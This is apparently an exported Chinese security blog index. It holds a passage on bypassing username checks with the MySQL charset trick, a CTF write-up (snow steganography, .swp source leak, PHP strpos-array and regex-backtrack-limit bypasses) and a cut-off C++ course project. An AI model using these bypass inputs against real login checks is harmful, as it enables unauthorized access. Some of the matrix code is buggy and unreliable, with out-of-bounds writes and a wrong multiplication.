'&#123;$password&#125;'"</span>);</span></span><br></pre></td></tr></table></figure><p>if语句嫌疑很大，大概是考我们怎么登陆admin的账号</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>在我们这个案例中，character_set_client和character_set_connection被设置成了utf8，而内部操作字符集其实也就是username字段的字符集还是默认的latin1。于是，整个操作就有如下字符串转换过程：</p><p>utf8 –&gt; utf8 –&gt; latin1</p><p>最后执行比较username=’admin’的时候，’admin’是一个latin1字符串。<br>Mysql在转换字符集的时候，将不完整的字符给忽略了。<br>举个简单的例子，佬这个汉字的UTF-8编码是\xE4\xBD\xAC，我们可以依次尝试访问下面三个URL：</p><pre><code>http://localhost:9090/test.php?username=admin%e4http://localhost:9090/test.php?username=admin%e4%bdhttp://localhost:9090/test.php?username=admin%e4%bd%ac</code></pre><p>可以发现，前两者都能成功获取到username=admin的结果，而最后一个URL，也就是当我输入佬字完整的编码时，将会失败：</p><p><strong>为什么会抛出错误？</strong><br>原因很简单，因为latin1并不支持汉字，所以utf8汉字转换成latin1时就抛出了错误。</p><p>那前两次为什么没有抛出错误？因为前两次输入的编码并不完整，Mysql在进行编码转换时，就将其忽略了。</p><p>这个特点也导致，我们查询username=admin%e4时，%e4被省略，最后查出了username=admin的结果。</p><h2 id="只有部分字符可以使用"><a href="#只有部分字符可以使用" class="headerlink" title="只有部分字符可以使用"></a>只有部分字符可以使用</h2><p>我在测试这个Trick的时候发现，username=admin%c2时可以正确得到结果，但username=admin%c1就不行，这是为什么？<br>简单fuzz了一下，如果在admin后面加上一个字符，有如下结果：</p><pre><code>\x00~\x7F： 返回空白结果\x80~\xC1： 返回错误Illegal mix of collations\xC2~\xEF： 返回admin的结果\xF0~\xFF： 返回错误Illegal mix of collations</code></pre><h2 id="实战二"><a href="#实战二" class="headerlink" title="实战二"></a>实战二</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-12/67794247.jpg" alt=""><br>同理是这个if语句</p><pre><code>比较$row[&apos;id&apos;]和$id的区别</code></pre><p>令id=%c2 即可</p><h2 id="实战三"><a href="#实战三" class="headerlink" title="实战三"></a>实战三</h2><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>使用MySQL字符集时的建议</p><p>建立数据库/表和进行数据库操作时尽量显式指出使用的字符集，而不是依赖于MySQL的默认设置，否则MySQL升级时可能带来很大困扰；</p><p>• 数据库和连接字符集都使用latin1时虽然大部分情况下都可以解决乱码问题，但缺点是无法以字符为单位来进行SQL操作，一般情况下将数据库和连接字符集都置为utf8是较好的选择；</p><p>• 使用mysql C API时，初始化数据库句柄后马上用mysql_options设定MYSQL_SET_CHARSET_NAME属性为utf8，这样就不用显式地用 SET NAMES语句指定连接字符集，且用mysql_ping重连断开的长连接时也会把连接字符集重置为utf8；</p><p>• 对于mysql PHP API，一般页面级的PHP程序总运行时间较短，在连接到数据库以后显式用SET NAMES语句设置一次连接字符集即可；但当使用长连接时，请注意保持连接通畅并在断开重连后用SET NAMES语句显式重置连接字符集。</p><p>其他注意事项<br>• my.cnf中的default_character_set设置只影响mysql命令连接服务器时的连接字符集，不会对使用libmysqlclient库的应用程序产生任何作用！</p><p>• 对字段进行的SQL函数操作通常都是以内部操作字符集进行的，不受连接字符集设置的影响。</p><p>• SQL语句中的裸字符串会受到连接字符集或introducer设置的影响，对于比较之类的操作可能产生完全不同的结果，需要小心！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.leavesongs.com/PENETRATION/mysql-charset-trick.html" target="_blank" rel="noopener">Mysql字符编码利用技巧</a><br><a href="http://www.laruence.com/2008/01/05/3192.html" target="_blank" rel="noopener">深入Mysql字符集设置</a><br><a href="https://www.leavesongs.com/PENETRATION/Mini-XCTF-Writeup.html" target="_blank" rel="noopener">XCTF两道web题目的writeup</a></p><p><a href="https://www.jb51.net/article/132521.htm" target="_blank" rel="noopener">带你5分钟读懂MySQL字符集设置</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018·i春秋圣诞欢乐赛官方WriteUp</title>
      <link href="/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/"/>
      <url>/2019/01/12/2018%C2%B7i%E6%98%A5%E7%A7%8B%E5%9C%A3%E8%AF%9E%E6%AC%A2%E4%B9%90%E8%B5%9B%E5%AE%98%E6%96%B9WriteUp/</url>
      
        <content type="html"><![CDATA[<h2 id="gift"><a href="#gift" class="headerlink" title="gift"></a>gift</h2><p>打开页面<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41923075.jpg" alt=""></p><p>考点: snow html隐写</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">snow</span> 是一款在html嵌入隐写信息的软件，</span><br><span class="line">它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，</span><br><span class="line">不同空格与制表位的组合代表不同的嵌入信息。</span><br></pre></td></tr></table></figure><p>解密网址：<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a><br>密钥为题目名字<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/37624188.jpg" alt=""></p><h2 id="gift-php"><a href="#gift-php" class="headerlink" title="gift php"></a>gift php</h2><p>Do you know .swp file? 非正常关闭vi编辑器时会生成一个.swp文件<br>访问.index.php.swp下载下来， vim-r.index.php.swp还原即可 源码 </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">areyouok</span><span class="params">($greeting)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> preg_match(<span class="string">'/Merry.*Christmas/is'</span>,$greeting);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$greeting=@$_POST[<span class="string">'greeting'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!areyouok($greeting))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(strpos($greeting,<span class="string">'Merry Christmas'</span>)!==<span class="keyword">false</span>)&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Merry Christmas. '</span>.<span class="string">'flag&#123;****&#125;'</span>;</span></span><br><span class="line"><span class="php">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">'Do you know .swp file?'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'Do you know PHP?'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>要求post一个 greeting参数，经过areyouok函数正则过滤后如果返回false，<br>就进入下一个if，如果 greeting参数包含 MerryChristmas则打印flag。<br>可以利用strpos函数的一个漏洞，传入一个数组，会返回 NULL， NULL不强等于false，即可绕过。<br><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/41317872.jpg" alt=""></p><h2 id="gift-php-plus"><a href="#gift-php-plus" class="headerlink" title="gift php plus"></a>gift php plus</h2><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/59998626.jpg" alt=""><br>这题是在gift php的基础上加上了is_array的判断，不允许使用数组来绕过。</p><p>所以上一道题的思路不能再用了。 这里需要用到正则回溯，可以参考p牛的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限 pcre.backtrack_limit，默认为100万。当正则回溯超过这个上限时，就会返回false。 </p><p>因此我们只要post100万个字符，让它回溯大于100万次，函数就会返回false，从而绕过if判断。 </p><p><img src="http://pkf8r5ond.bkt.clouddn.com/19-1-9/10130370.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>大二上学期期末C++课程设计</title>
      <link href="/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
      <url>/2019/01/12/%E5%A4%A7%E4%BA%8C%E4%B8%8A%E5%AD%A6%E6%9C%9F%E6%9C%9F%E6%9C%ABC-%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="题目一矩阵运算"><a href="#题目一矩阵运算" class="headerlink" title="题目一矩阵运算"></a>题目一矩阵运算</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Matrix</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> b[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> result[<span class="number">2</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Matrix();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">subtraction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">multiplication</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">division</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transpose</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line">Matrix::Matrix()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    a[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">b[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line">result[<span class="number">2</span>][<span class="number">2</span>]=<span class="number">0</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入矩阵A:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入矩阵B:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;b[i][j];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"你输入的矩阵A为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">"你输入的矩阵B为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">2</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">2</span>; ++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;b[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::add()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"相加结果为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]+b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::subtraction()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"相加结果为"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]-b[i][j];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::multiplication()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">2</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j] = a[i][j]*b[i][j] + a[i][j]*b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">"  "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::division()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> Matrix::transpose()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"A转置为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=a[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"B转置为:"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">2</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line">result[i][j]=b[j][i];</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;result[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">&#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":        菜单      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      1.加法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      2.减法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      3.乘法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      4.除法      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      5.转置      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">":      0.退出      "</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"-------------------"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"请输入要进行的操作"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt;h;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">switch</span>(h)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.subtraction();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.multiplication();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.division();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">&#123;</span><br><span class="line">Matrix M;</span><br><span class="line">M.transpose();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"退出成功"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>: <span class="built_in">cout</span>&lt;&lt;<span class="string">"输入错误"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="题目二-求不同图形面积"><a href="#题目二-求不同图形面积" class="headerlink" title="题目二  求不同图形面积"></a>题目二  求不同图形面积</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Graphic</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">double</span> length;</span><br><span class="line"><span class="keyword">double</span> tall;</span><br><span class="line">Graphic(<span class="built_in">string</span> s,<span class="keyword">double</span> a,<span class="keyword">double</span> b=<span class="number">0</span>):name(s),length(a),tall(b)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Square</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Square(<span class="keyword">double</span> a):Graphic(<span class="string">"Square"</span>,a)</span><br><span class="line">&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"Square'area:"</span>&lt;&lt;length*length&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// ~Square();</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Circle</span>:</span><span class="keyword">public</span> Graphic</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">Circle(<span class="keyword">double</span> a):Graphic(<span class="string">"Circle"</span>,a)&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 